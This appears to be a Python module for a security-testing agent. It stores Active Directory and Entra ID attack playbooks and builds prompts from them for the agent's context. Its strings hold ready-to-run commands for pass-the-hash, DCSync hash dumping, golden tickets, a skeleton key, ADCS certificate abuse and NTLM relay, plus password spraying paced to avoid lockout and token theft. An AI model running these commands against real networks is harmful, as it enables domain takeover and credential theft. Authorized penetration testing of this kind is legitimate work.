"""Active Directory security knowledge base.

Deep knowledge about AD attack techniques:
1. Domain enumeration and reconnaissance
2. Privilege escalation paths
3. Lateral movement techniques
4. Persistence mechanisms
5. Trust abuse
6. Certificate Services (ADCS) attacks
7. Group Policy exploitation
8. Azure AD / Entra ID attacks
"""

from __future__ import annotations

from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class ADAttackPattern:
    """An Active Directory attack pattern with methodology."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    mitre_technique: str = ""
    description: str = ""
    testing_methodology: str = ""
    tools: list[str] = field(default_factory=list)
    prerequisites: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:30],
            "category": self.category[:15],
            "mitre": self.mitre_technique[:12],
        }


AD_ATTACK_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "ad-001", "name": "AD Domain Enumeration",
        "category": "recon", "severity": "medium",
        "mitre": "T1087,T1069",
        "desc": "Comprehensive Active Directory reconnaissance.",
        "testing": (
            "AD DOMAIN ENUMERATION:\n"
            "1. UNAUTHENTICATED:\n"
            "   - Null session: rpcclient -U '' target\n"
            "   - LDAP anonymous: ldapsearch -x -H ldap://DC\n"
            "   - DNS: dig -t SRV _ldap._tcp.domain.com\n"
            "   - Kerberos: kerbrute userenum --dc DC users.txt\n"
            "2. AUTHENTICATED (low-priv user):\n"
            "   - BloodHound: bloodhound-python -c All -d domain -u user -p pass\n"
            "   - ldapdomaindump: ldapdomaindump -u domain\\\\user -p pass DC\n"
            "   - PowerView equivalents:\n"
            "     * Get-DomainUser → ldapsearch '(objectClass=user)'\n"
            "     * Get-DomainGroup → ldapsearch '(objectClass=group)'\n"
            "     * Get-DomainComputer → ldapsearch '(objectClass=computer)'\n"
            "   - crackmapexec: cme smb DC -u user -p pass --users/--groups/--shares\n"
            "3. KEY OBJECTS TO FIND:\n"
            "   - Domain Admins, Enterprise Admins, Schema Admins\n"
            "   - Accounts with SPN (Kerberoastable)\n"
            "   - Accounts without preauth (AS-REP roastable)\n"
            "   - Computers with unconstrained delegation\n"
            "   - Trust relationships\n"
            "   - Group Policy Objects (GPOs)\n"
            "   - LAPS enabled computers\n"
            "4. BLOODHOUND ANALYSIS:\n"
            "   - Shortest path to Domain Admin\n"
            "   - Find all Kerberoastable accounts\n"
            "   - High-value targets\n"
            "   - ACL attack paths"
        ),
        "tools": ["bloodhound", "crackmapexec", "ldapsearch", "kerbrute"],
    },
    {
        "id": "ad-002", "name": "AD Privilege Escalation",
        "category": "privesc", "severity": "critical",
        "mitre": "T1078,T1134",
        "desc": "Active Directory privilege escalation techniques.",
        "testing": (
            "AD PRIVILEGE ESCALATION:\n"
            "1. ACL ABUSE:\n"
            "   - GenericAll on user → Reset password, add to group\n"
            "   - GenericWrite → Modify msDS-KeyCredentialLink (shadow creds)\n"
            "   - WriteDACL → Grant yourself GenericAll\n"
            "   - ForceChangePassword → Reset without knowing current\n"
            "   - AddMember → Add yourself to privileged groups\n"
            "   - WriteOwner → Take ownership, then modify DACLs\n"
            "   Tools: bloodyAD, dacledit (impacket), PowerView\n"
            "2. GROUP POLICY:\n"
            "   - GPO abuse: If you can modify a GPO linked to admin OUs\n"
            "   - Scheduled tasks via GPO\n"
            "   - Service installation via GPO\n"
            "   - Registry modification via GPO\n"
            "3. DELEGATION ABUSE:\n"
            "   - Unconstrained: Capture TGTs of connecting users\n"
            "   - Constrained: S4U2Self + S4U2Proxy for impersonation\n"
            "   - RBCD: Modify msDS-AllowedToActOnBehalfOfOtherIdentity\n"
            "4. ADCS (Certificate Services):\n"
            "   - ESC1: Requestor specifies subject in template\n"
            "   - ESC2: Any purpose EKU in template\n"
            "   - ESC3: Enrollment agent template\n"
            "   - ESC4: Vulnerable template ACLs\n"
            "   - ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA\n"
            "   - ESC7: Manage CA permission on CA server\n"
            "   - ESC8: NTLM relay to HTTP enrollment endpoint\n"
            "   - Tool: certipy find -vulnerable -u user -p pass -dc-ip DC\n"
            "5. SHADOW CREDENTIALS:\n"
            "   - Modify msDS-KeyCredentialLink → authenticate as target\n"
            "   - whisker.py add -u user -p pass -t target_user -dc-ip DC"
        ),
        "tools": ["certipy", "bloodyAD", "impacket", "whisker"],
    },
    {
        "id": "ad-003", "name": "Lateral Movement in AD",
        "category": "lateral", "severity": "critical",
        "mitre": "T1021,T1550",
        "desc": "Moving between systems in Active Directory.",
        "testing": (
            "AD LATERAL MOVEMENT:\n"
            "1. PASS-THE-HASH (PtH):\n"
            "   - impacket-psexec domain/user@target -hashes :NTLM_HASH\n"
            "   - impacket-wmiexec domain/user@target -hashes :NTLM_HASH\n"
            "   - crackmapexec smb targets -u user -H NTLM_HASH --exec-method smbexec\n"
            "2. PASS-THE-TICKET (PtT):\n"
            "   - export KRB5CCNAME=ticket.ccache\n"
            "   - impacket-psexec domain/user@target -k -no-pass\n"
            "3. OVERPASS-THE-HASH:\n"
            "   - Convert NTLM hash to Kerberos ticket\n"
            "   - getTGT.py domain/user -hashes :NTLM_HASH\n"
            "4. REMOTE EXECUTION:\n"
            "   - PsExec: Creates service, runs as SYSTEM\n"
            "   - WMIExec: Windows Management Instrumentation\n"
            "   - SMBExec: SMB service creation\n"
            "   - AtExec: Scheduled task creation\n"
            "   - DCOM: Distributed COM (MMC20, ShellWindows)\n"
            "5. CREDENTIAL DUMPING:\n"
            "   - secretsdump.py domain/user@target -hashes :HASH\n"
            "   - Dumps: SAM hashes, LSA secrets, cached domain creds\n"
            "   - DCSync: secretsdump.py -just-dc domain/admin@DC\n"
            "   - Extracts ALL domain password hashes from DC\n"
            "6. RDP:\n"
            "   - With hash: xfreerdp /v:target /u:user /pth:HASH\n"
            "   - Check: crackmapexec rdp targets -u user -p pass"
        ),
        "tools": ["impacket", "crackmapexec", "xfreerdp", "Rubeus"],
    },
    {
        "id": "ad-004", "name": "AD Persistence Techniques",
        "category": "persistence", "severity": "critical",
        "mitre": "T1098,T1136",
        "desc": "Maintaining access in Active Directory environments.",
        "testing": (
            "AD PERSISTENCE TESTING:\n"
            "1. GOLDEN TICKET:\n"
            "   - Requires: krbtgt NTLM hash (from DCSync)\n"
            "   - ticketer.py -domain DOMAIN -domain-sid SID -nthash KRBTGT_HASH\n"
            "   - Valid for 10 years by default\n"
            "   - Detection: Monitor krbtgt password changes\n"
            "2. SILVER TICKET:\n"
            "   - Requires: Service account hash\n"
            "   - Forged TGS for specific service\n"
            "   - Harder to detect (no DC interaction)\n"
            "3. SKELETON KEY:\n"
            "   - Patches LSASS on DC\n"
            "   - Any password works alongside real password\n"
            "   - mimikatz misc::skeleton\n"
            "   - Survives reboot if applied to ntds.dit\n"
            "4. DSRM (Directory Services Restore Mode):\n"
            "   - Local admin on DC via DSRM password\n"
            "   - Often never changed since domain creation\n"
            "   - Enable: reg HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2\n"
            "5. ADMINSDHOLDR:\n"
            "   - Modify AdminSDHolder ACL\n"
            "   - ACL propagates to all protected groups every 60 min\n"
            "   - Add hidden backdoor ACE\n"
            "6. MACHINE ACCOUNT:\n"
            "   - Create computer account (default: any user can add 10)\n"
            "   - Computer accounts can authenticate and access resources\n"
            "   - addcomputer.py domain/user:pass -computer-name EVIL$ -computer-pass Pass123"
        ),
        "tools": ["impacket", "mimikatz", "Rubeus"],
    },
    {
        "id": "ad-005", "name": "ADCS Certificate Attacks",
        "category": "adcs", "severity": "critical",
        "mitre": "T1649",
        "desc": "Active Directory Certificate Services exploitation.",
        "testing": (
            "ADCS CERTIFICATE ATTACKS:\n"
            "1. ENUMERATE:\n"
            "   certipy find -u user@domain -p pass -dc-ip DC\n"
            "   certipy find -vulnerable -u user -p pass -dc-ip DC\n"
            "2. ESC1 — REQUESTOR CAN SPECIFY SAN:\n"
            "   Template allows enrollee to specify subjectAltName\n"
            "   certipy req -u user -p pass -ca CA-NAME -template TEMPLATE \\\n"
            "     -upn administrator@domain -dc-ip DC\n"
            "   certipy auth -pfx admin.pfx -dc-ip DC → NT hash\n"
            "3. ESC4 — VULNERABLE TEMPLATE ACLS:\n"
            "   User has write access to certificate template\n"
            "   Modify template to enable ESC1 conditions\n"
            "   certipy template -u user -p pass -template TEMPLATE \\\n"
            "     -save-old -dc-ip DC\n"
            "4. ESC6 — EDITF FLAG ON CA:\n"
            "   CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag\n"
            "   Any template can include arbitrary SAN\n"
            "   Check: certutil -config \"CA\\CA-NAME\" -getreg policy\\EditFlags\n"
            "5. ESC8 — NTLM RELAY TO HTTP ENROLLMENT:\n"
            "   CA has HTTP enrollment endpoint without EPA\n"
            "   ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp \\\n"
            "     -smb2support --adcs --template DomainController\n"
            "   Coerce DC → relay to CA → get DC certificate\n"
            "6. CERTIFICATE PERSISTENCE:\n"
            "   - Certificates valid for 1+ years\n"
            "   - Password changes DON'T invalidate certificates\n"
            "   - Can authenticate as any user with valid cert"
        ),
        "tools": ["certipy", "impacket-ntlmrelayx", "Rubeus"],
    },
    {
        "id": "ad-006", "name": "Azure AD / Entra ID Attacks",
        "category": "cloud_ad", "severity": "critical",
        "mitre": "T1078.004",
        "desc": "Azure Active Directory and hybrid environment attacks.",
        "testing": (
            "AZURE AD / ENTRA ID ATTACKS:\n"
            "1. ENUMERATION:\n"
            "   - Check tenant: https://login.microsoftonline.com/domain/.well-known/openid-configuration\n"
            "   - AADInternals: Get-AADIntTenantDetails\n"
            "   - ROADtools: roadrecon auth -u user@domain -p pass\n"
            "   - roadrecon gather → SQLite database of all AAD objects\n"
            "2. PASSWORD SPRAY:\n"
            "   - Azure AD lockout: 10 attempts / 60 seconds\n"
            "   - Use 1 password per 60+ seconds across all users\n"
            "   - Check user existence first: o365spray --validate\n"
            "   - MFASweep: Test which users have MFA enabled\n"
            "3. TOKEN ATTACKS:\n"
            "   - Steal tokens from: az cli cache, .azure/, browser\n"
            "   - Refresh token → access token: AADInternals\n"
            "   - Primary Refresh Token (PRT) theft for SSO\n"
            "   - Device code phishing: Request device code, victim enters it\n"
            "4. HYBRID ATTACKS:\n"
            "   - Azure AD Connect sync account → DCSync on-prem\n"
            "   - Password hash sync: Steal hash DB from AADC server\n"
            "   - Pass-Through Auth: Intercept PTA agent credentials\n"
            "   - Federation (ADFS): Golden SAML — forge SAML tokens\n"
            "5. PRIVILEGE ESCALATION:\n"
            "   - Application admin → Add credentials to service principal\n"
            "   - Consent grant attack: Phish admin consent for malicious app\n"
            "   - Managed identity abuse from compromised VM\n"
            "6. PERSISTENCE:\n"
            "   - Add credentials to application/service principal\n"
            "   - Federation backdoor: Add trusted federation domain\n"
            "   - PRT cookie for persistent SSO"
        ),
        "tools": ["ROADtools", "AADInternals", "o365spray", "AzureHound"],
    },
]


class ActiveDirectoryKB:
    """Active Directory security knowledge base.

    Provides deep AD attack methodology injected into
    agent prompts for enterprise security assessment.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, ADAttackPattern] = {}
        self._log = logger.bind(component="active_directory_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load AD attack patterns."""
        for data in AD_ATTACK_PATTERNS:
            pattern = ADAttackPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                mitre_technique=data.get("mitre", ""),
                description=data.get("desc", ""),
                testing_methodology=data.get("testing", ""),
                tools=data.get("tools", []),
                prerequisites=data.get("prerequisites", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_patterns_for_category(
        self,
        category: str,
    ) -> list[ADAttackPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category == category
        ]

    def get_testing_prompts(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 3,
    ) -> list[str]:
        """Get testing prompts for agent context injection."""
        prompts = []
        for pattern in self._patterns.values():
            if categories and pattern.category not in categories:
                continue
            if pattern.testing_methodology:
                prompts.append(pattern.testing_methodology)
            if len(prompts) >= max_patterns:
                break
        return prompts

    def build_ad_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 3,
    ) -> str:
        """Build AD testing prompt."""
        lines = ["## Active Directory Security Testing\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category not in categories:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.severity.upper()}]")
            if pattern.mitre_technique:
                lines.append(f"MITRE ATT&CK: {pattern.mitre_technique}")
            lines.append(pattern.testing_methodology)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = defaultdict(int)
        for p in self._patterns.values():
            cat_counts[p.category] += 1
        return {
            "patterns": len(self._patterns),
            "by_category": dict(cat_counts),
        }
